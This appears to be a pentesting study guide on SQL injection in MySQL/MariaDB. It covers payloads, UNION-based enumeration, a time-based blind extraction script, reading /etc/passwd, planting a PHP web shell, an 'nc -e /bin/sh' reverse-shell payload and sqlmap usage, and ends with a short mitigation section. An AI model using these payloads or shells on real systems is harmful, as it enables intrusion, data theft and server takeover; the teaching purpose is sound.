A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.

# Basic usage
Maybe the database have the default login, we can try with:
```console
$ mysql -u <user> -p<password> -P <port> -h <ip>
```

| **Flag**    | **Usage**    | **Description**    |
|---------------- | --------------- | --------------- |
| `-u`    | `-u <user>`    | Select user, for example root    |
| `-p` | `-p<password` | Select password, must be without space. If left in blank, mysql will ask the password |
| `-h` | `-h <host>` | Select an IP/Host |


## Syntax 

- Databases list and change 

```console
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> USE users;

Database changed
```

- See tables and info

```console
mysql> SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)

mysql> DESCRIBE logins;

+-----------------+--------------+

+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

- Limit

mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

## Operators 

- **AND**

```console
mysql> SELECT 1 = 1 AND 'test' = 'test';

+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+
1 row in set (0.00 sec)

# AND can be replaced by &&
```

- **OR**

```console
mysql> SELECT 1 = 1 OR 'test' = 'abc';

+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set (0.00 sec)

# OR can be replaced by ||
```

- **NOT**

```console
mysql> SELECT NOT 1 = 1;

+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+
1 row in set (0.00 sec)

# NOT can be replaced by !
```

# SQL Injection 

SQL Injection can appear in any field of a application that make a query to a database or API. Login, search,...

Take this code as an example:
```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

The user will input in the `searchInput` variable, which will go directly to the database. The SQL query would be:
```sql
select * from logins where username like '%$searchInput'
```

If we send some input like `'%1'; DROP TABLE users;'` the final output will be:
```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

## Syntax Errors 

The last query will return an error. This is because the query is ending with `'`. We need to add a comment at the end of our input to remove it. There are different comment for each program, more information down.

## Types 

There are three main types: **In-band**, **Blind** and **Out-of-band**. 

**In-band** he output of both the intended and the new query may be printed directly on the front end, therefore we can read it. There are two types, **Union Based** and **Error Based**. With **Union Based** SQL injection, we may have to specify the exact location, which we can read, so the query will direct the output to be printed there. **Error Based** SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.

In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character, this is **Blind** SQLi. Also has two types: **Boolean Based** and **Time Based**. With **Boolean Based** we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true. For **Time Based** SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.

Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.

---

# In-band 

### SQLi Discovery 

The first thing to do is test if the application is vulnerable to SQLi. We can try the following payload in some fields, like login page or search page:

| **Payload**   | **URL Encoded**    |
|--------------- | --------------- |
| `'`   | %27   |
| `"` | %22 |
| `#` | %23 |
| `;` | %3B |
| `)` | %29 |


### OR Injection

We need to get always *true* statement to test. With the **OR** operator we can get a always true statement, for example `1 = 1`. So, we can try the following payload:
```sql
test' OR '1'='1
```

> Don't place a `'`, usually the query will add their own.
{: .prompt-info}


The final query could be:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

Probably we need to change the text to bypass filter:
```sql
aNd 1=1
aNd 21=21
orDeR bY 1
orDer+bY+1
orDer/\*\*/bY/\*\*/1
orDer%20bY%201
```

We can change the spaces by:
```sql
+, /**/, %20
```

> Probably, we need to add **;** at the end of the query (before the comment).
{: .prompt-tip }

### Comments 

Another way is to add a comment at the end of our input, in order to remove everythin after our input. These are some common comments:

| **Database name**   | **Comment**    |
|--------------- | --------------- |
| Oracle   | `--`   |
| MySQL | `/* */` `--` |
| MariaDB | `/* */` `#` |
| Others comments | `/*` `//` `%23` |

> Probably you need to add a space after the comment 
{: .prompt-tip}

## Union 

### Union Clause

With the `UNION` syntax we can make two query inside of one, take the next example:
```console
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

**UNION** can only operate in **SELECT** with the same number of columns. We need to guess the number of columns to operate. Adding:
```sql
... ORDER BY 5; --
```
If it gives an error we must lowered the number, if there isn't a error use a higher number until you guess which is the columns number (last correct number).

> (We can change **--** to others SQL comments.)
{: .prompt-tip }

Then we can do an union with the columns. This is a basic UNION syntax:
```sql
... UNION SELECT 1,2,3,4,5;
... UNION SELECT NULL,NULL,NULL,NULL,NULL;
```
Placing numbers at first could help us guessing which columns are displaying the application. Maybe it needs 5 columns, but only display the 2,3 and 5. This would help us later when we want to see data from the database.

Now, we can replace this values by important info (as the database name, user,...)

---

# Blind 

## Time Based 

We can make sleep the sql function in order to guess if the page is not displaying anything.

For example:
```sql
... 'admin' and sleep(5) --If the user is correct it will wait 5 sec 
... AND if(substr(database(),1,1)='c', sleep(5),1); --
```

We can make a Python Script:
```python
#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

url = '[your-url]'
s = '0123456789abcdefghijklmnopqrstuvwxyz'
result = ''

def def_handler(sig, frame):
	log.failure("Exiting")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def check(payload):
	data_post = {
		'username' : '%s' % payload,
		'password' : 'test'
	}

	time_start = time.time()
	content = requests.post(url, data=data_post)
	time_end = time.time()

	if (time_end - time_start > 5):
		return 1

p1 = log.progress('Database')
p2 = log.progress('Payload')

for i in range(0,10):
	for c in s:
		payload = "' OR if(substr(database(),%d,1)='%c', sleep(5),1); -- - % (i, c)"
		p2.status("%s" % payload)
		
		if check(payload):
			result += c
			p1.status("%s % result")
			break

log.info("Database: %s" % result)
```

We can change **database()** from others functions to guess another values (tables, columns,...).

# Explotation 

## Database enumeration 

### General functions 

We can use some of this function to get fast information:

| **Payload**   | **Description**    |
|--------------- | --------------- |
| `database()`   | Get the current database   |
| `user()` | Get the current user

### MySQL Fingerprinting 

We can use the following:

| **Payload**    | **When to use**    | **Expected Output**    | **Wrong Output** |
|---------------- | --------------- | --------------- | ------------ |
| `SELECT @@version`   | Full query output    | MySQL Version (`10.3.22-MariaDB-1ubuntu1`)    | Error with other DBMS |
| `SELECT POW(1,1)` | Only have numeric output | `1` | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0` | Will not delay response with other DBMS |

To use a proper **UNION SELECT** query we need the information about the whole database. This mean knowing:
- List of databases
- List of tables within each database
- List of columns within each table

### INFORMATION\_SCHEMA
Using the **INFORMATION_SCHEMA** database, which content data about other databases and tables, we can enumerate all the information. For get a **table** from a **database**:
```sql
SELECT * FROM <database>.<table>;
```

With this query we can use the **INFORMATION_SCHEMA** to:

#### Databases 

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Now we can use the **UNION** to get the database name for each row present in the application, using the following payload:
```sql
'something' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```

To get the current database use the function `database()`:
```sql
`something` UNION select 1,database(),2,3-- 
```

Some databases can limit the amount on databases show, we can try to change it with limit:
```sql
... UNION SELECT schema_name,NULL FROM information_schema.schemata LIMIT 1,1; -- This will show the first one
... UNION SELECT schema_name,NULL FROM information_schema.schemata LIMIT 2,1; -- This will show the second one
```

#### Tables 

Before dumping data from a database we need to know their tables. Let's use **TABLE** from **INFORMATION_SCHEMA**. It has some variables like **TABLE_SCHEMA** or **TABLE_NAME**.
```sql
'something' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'--
```

#### Colums 

Now it's time to get the columns. Also, inside **INFORMATION_SCHEMA** we have **COLUMNS**. The variables **COLUMN_NAME**, with **TABLE_NAME** and **TABLE_SCHEMA** will help. For example:
```sql
'something' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'--
```

#### Data 

Now, with all this information we can start dumping data. Using the same **UNION** syntax:
```sql
'something' UNION select 1,<column>,<column>,4 from <database>.<table> --
```

## Reading files 

### Privileges 

In MySQL, the DB user must have the **FILE** privilege to read file's content. First, start enumeration data about the user privilege.

The following functions will get us the user:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Or with an **UNION**:
```sql
'something' UNION SELECT 1, user(), 3, 4-- 
'something' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```

To get the privileges of the current user, first test if we have superadmin.
```sql
SELECT super_priv FROM mysql.user
'something' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
```

If we have many user we can filter them:
```sql
'something' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<user>"-- 
```

If the query return `Y` we have superuser privileges.

We can also use **INFORMATION_SCHEMA**:
```sql
SELECT sql_grants FROM information_schema.sql_show_grants
'something' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
```

> Add `WHERE user="<user>"` whenever is necessary
{: .prompt-tip}

### LOAD\_FILE

This function will allow us to read files. Just with one argument, the file path:
```sql
SELECT LOAD_FILE('/etc/passwd');
'something' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```

## Writing files

In order to write files we need:
- User with **FILE** privilege 
- MySQL global **secure_file_priv** variable not enabled
- Write access to the location we want to write to on the back-end server 

### secure\_file\_priv 

This variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, **NULL** means we cannot read/write from any directory. MariaDB has this set empty by default, meanwhile MySQL uses `/var/lib/mysql-files`{: .filepath}. Some modern configuration has **NULL** value.

To check this variable:
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
'something' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
```

### SELECT INTO OUTFILE 

Take an example...
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

...will be:
```console
zero@pio$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45
```

### Writing Files through SQL Injection 

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
'something' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
```

### Web Shells and reverse shells

Taking for example a PHP server and the following web shell:
```php
<?php system($_REQUEST[cmd]); ?>
```

We can insert it:
```sql
'something' union select 1,'<?php system($_REQUEST[cmd]); ?>',3,4 into outfile '/var/www/html/shell.php'-- 
```

And access it from the web.
```
http://<ip>/shell.php?cmd=id
```

Another option is to create a reverse shell with the following payload:
```php
<?passthru("nc -e /bin/sh <your ip> <port>");?>
```

Just accessing the file, without parameters and with a netcat open and we will get the reverse shell.

## Major Tip

If we can not pass a string like **"database-name"** we can encode it:
```console
$ echo "database-name" | xxd -ps
```
> We may remove the **0a**, and add a **0x** at the beggining.
{: .prompt-tip}

---

# SQLmap
We can try searching a URL with:
```console
> sqlmap -u "http://<ip>/index.php?page=test"
```

With **Burp** we can capture the request and do the scan with a file with the header:
```console
> sqlmap -r req.txt
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-u <url>` | Add the target URL |
| `-r <file>` | Add the target URL in a request file |
| `--os-shell`   | Spawn a console shell if it is possible   |
| `--sql-shell` | Spawn a SQL shell if it is possible |

---

# Mitigating

## Input Sanitization

Some functions could help sanitizating the input:
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
```

## Input Validation 

Remove some strings:
```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
```

## User Privileges 

We should ensure that the user querying the database only has minimum permissions. Superusers and users with administrative privileges should never be used with web applications. This will create a *reader* user with only **SELECT** privileges:
```console
MariaDB [(none)]> CREATE USER 'reader'@'localhost';

MariaDB [(none)]> GRANT SELECT ON <database>.<table> TO 'reader'@'localhost' IDENTIFIED BY '<password>';
```

## Web Application Firewall (WAF)

## Parameterized Queries 

Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
```php
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
```
